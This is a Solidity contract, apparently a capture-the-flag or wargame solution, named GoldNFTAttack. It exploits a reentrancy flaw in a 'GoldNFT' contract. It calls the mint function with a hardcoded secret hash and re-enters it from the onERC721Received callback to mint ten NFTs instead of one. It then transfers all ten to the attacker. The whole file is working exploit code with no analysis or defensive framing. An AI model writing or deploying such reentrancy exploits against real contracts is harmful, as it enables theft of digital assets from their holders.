// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoldNFT{
    function takeONEnft(bytes32) external;
    function transferFrom(address, address, uint256) external;
}

contract GoldNFTAttack {
    IGoldNFT private goldNFT;
    uint8 alreadyMinted;

    constructor(address _goldNFT) {
        goldNFT = IGoldNFT(_goldNFT);
    }

    function attack() external {
        //init attack
        goldNFT.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);

        //now contract has 10 NFTs, so we need to transfer it back to hacker(msg.sender)
        for (uint8 i = 1; i < 11;) {
            goldNFT.transferFrom(address(this), msg.sender, i);
            unchecked{i++;}
        }
    }

    function onERC721Received(address,address,uint256,bytes memory) external returns (bytes4) {
        alreadyMinted++;
        //to ensure that only 10 is minted
        if(alreadyMinted < 11) goldNFT.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        //return to make sure that it wont revert on this line https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L468C20-L468C20
        return this.onERC721Received.selector;
    }
}